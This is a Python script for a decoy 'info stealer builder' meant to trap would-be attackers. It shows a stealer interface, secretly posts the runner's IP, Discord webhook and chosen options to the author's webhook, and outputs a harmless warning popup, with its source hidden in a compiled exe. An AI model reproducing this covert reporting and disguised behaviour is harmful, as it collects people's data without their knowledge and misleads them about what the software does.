# Change the discord webhook below
# Save this as an .exe using pyinstaller so the attacker can't view source code
# Change this how ever you want



import tkinter as tk
from tkinter import messagebox, filedialog
import requests
import shutil
import socket
import os
import subprocess
import tempfile

DEFENDER_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE" # PUT WEBHOOK HERE

def send_attacker_info(webhook, options):
    ip = socket.gethostbyname(socket.gethostname())
    content = f"Builder Triggered!\nAttacker IP: {ip}\nDiscord Webhook: {webhook}\nOptions: {options}"
    try:
        requests.post(DEFENDER_WEBHOOK, json={"content": content})
    except Exception as e:
        print(f"Failed to send Discord message: {e}")

def log_status(message):
    status_box.config(state="normal")
    status_box.insert(tk.END, message + "\n")
    status_box.see(tk.END)
    status_box.config(state="disabled")

def build():
    attacker_webhook = webhook_entry.get()
    options = []
    if cpu_var.get(): options.append("CPU")
    if gpu_var.get(): options.append("GPU")
    if password_var.get(): options.append("Passwords")
    if cookies_var.get(): options.append("Cookies")

    if not attacker_webhook:
        messagebox.showwarning("Error", "Please enter a Discord webhook!")
        return

    log_status("❗ Window Might Buffer...")
    send_attacker_info(attacker_webhook, options)

    log_status("Generating victim payload...")
    popup_code = """import tkinter as tk
from tkinter import messagebox

def explain_what_happened():
    messagebox.showinfo("What Happened","An attacker tried to trick you but you are safe...")

def explain_honeypot():
    messagebox.showinfo("What Is a Honeypot","A honeypot is a safe decoy that protects users...")

def explain_attacker_consequences():
    messagebox.showinfo("What Will Happen To The Attacker","Attacker logged and tracked safely...")

root = tk.Tk()
root.title("Your System Was Almost Hurt")
root.geometry("870x450")
root.configure(bg="white")
header = tk.Frame(root, bg="#0B3D91", height=60)
header.pack(fill="x")
header_label = tk.Label(header, text="Security Alert", font=("Segoe UI", 20, "bold"), bg="#0B3D91", fg="white")
header_label.pack(pady=(5,0))
sub_label = tk.Label(header, text="Protected by Mitan7", font=("Segoe UI", 12, "italic"), bg="#0B3D91", fg="white")
sub_label.pack(pady=(0,5))
frame = tk.Frame(root, bg="white", padx=20, pady=20)
frame.pack(expand=True, fill="both")
message = ("A suspicious program was executed, but don’t worry...")
label = tk.Label(frame, text=message, font=("Segoe UI", 12), bg="white", fg="black", justify="left", anchor="w")
label.pack(anchor="w")
button_frame = tk.Frame(frame, bg="white")
button_frame.pack(pady=20)
btn1 = tk.Button(button_frame, text="What Happened?", command=explain_what_happened, bg="#2E64FE", fg="white", padx=10, pady=5)
btn1.grid(row=0,column=0,padx=10)
btn2 = tk.Button(button_frame, text="What Is a Honeypot?", command=explain_honeypot, bg="#2E64FE", fg="white", padx=10, pady=5)
btn2.grid(row=0,column=1,padx=10)
btn3 = tk.Button(button_frame, text="What Will Happen To The Attacker?", command=explain_attacker_consequences, bg="#2E64FE", fg="white", padx=10, pady=5)
btn3.grid(row=0,column=2,padx=10)
close_btn = tk.Button(frame, text="Close", command=root.destroy, bg="#1A1A1A", fg="white", padx=15, pady=6)
close_btn.pack(pady=(10,0))
root.mainloop()
"""

    temp_dir = tempfile.mkdtemp()
    temp_py = os.path.join(temp_dir, "victim_popup.py")
    with open(temp_py, "w", encoding="utf-8") as f:
        f.write(popup_code)

    log_status("Compiling victim payload...")
    try:
        subprocess.run(["pyinstaller", "--onefile", "--noconsole", temp_py], check=True)
    except Exception as e:
        messagebox.showerror("Error", f"Failed to build exe: {e}")
        return

    exe_path = os.path.join(temp_dir, "dist", "victim_popup.exe")
    save_path = filedialog.asksaveasfilename(
        defaultextension=".exe",
        filetypes=[("Executable","*.exe")],
        initialfile="InfoStealer_v2.1.exe"
    )
    if save_path:
        shutil.copy(exe_path, save_path)
        log_status(f"Build complete! Saved to {save_path}")
        messagebox.showinfo("Build Complete", f"Info stealer built at:\n{save_path}")

root = tk.Tk()
root.title("Info Stealer Builder")
root.geometry("600x500")
root.configure(bg="#1C1C1C")  

header = tk.Label(root, text="Info Stealer Builder v2.1", font=("Segoe UI", 16, "bold"), bg="#0B3D91", fg="white")
header.pack(fill="x", pady=(0,10))

payload_frame = tk.LabelFrame(root, text="Payload Options", fg="white", bg="#2E2E2E", font=("Segoe UI", 12, "bold"), padx=10, pady=10)
payload_frame.pack(fill="x", padx=10, pady=5)

tk.Label(payload_frame, text="Discord Webhook:", bg="#2E2E2E", fg="white").grid(row=0,column=0, sticky="w")
webhook_entry = tk.Entry(payload_frame, width=50)
webhook_entry.grid(row=0,column=1, padx=5, pady=5)

cpu_var = tk.BooleanVar()
gpu_var = tk.BooleanVar()
password_var = tk.BooleanVar()
cookies_var = tk.BooleanVar()

tk.Checkbutton(payload_frame, text="Steal CPU", variable=cpu_var, bg="#2E2E2E", fg="white", selectcolor="#2E2E2E").grid(row=1,column=0, sticky="w")
tk.Checkbutton(payload_frame, text="Steal GPU", variable=gpu_var, bg="#2E2E2E", fg="white", selectcolor="#2E2E2E").grid(row=1,column=1, sticky="w")
tk.Checkbutton(payload_frame, text="Steal Passwords", variable=password_var, bg="#2E2E2E", fg="white", selectcolor="#2E2E2E").grid(row=2,column=0, sticky="w")
tk.Checkbutton(payload_frame, text="Steal Cookies", variable=cookies_var, bg="#2E2E2E", fg="white", selectcolor="#2E2E2E").grid(row=2,column=1, sticky="w")

tk.Button(root, text="Build", command=build, bg="#2E64FE", fg="white", padx=15, pady=8).pack(pady=10)

status_frame = tk.LabelFrame(root, text="Build Status", fg="white", bg="#2E2E2E", font=("Segoe UI", 12, "bold"), padx=5, pady=5)
status_frame.pack(fill="both", expand=True, padx=10, pady=5)

status_box = tk.Text(status_frame, height=10, bg="#1C1C1C", fg="white", state="disabled")
status_box.pack(fill="both", expand=True)

root.mainloop()
